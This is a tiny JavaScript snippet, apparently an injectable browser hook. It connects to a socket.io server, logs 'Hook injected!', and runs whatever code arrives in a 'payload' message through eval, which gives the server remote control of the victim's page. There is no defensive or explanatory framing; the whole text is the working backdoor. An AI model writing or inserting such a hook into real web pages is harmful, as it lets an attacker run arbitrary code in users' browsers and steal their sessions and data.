var socket = io();


console.log("Hook injected!");
socket.on('payload', function(payload) {
    console.log("Payload received!");
    eval(payload);
});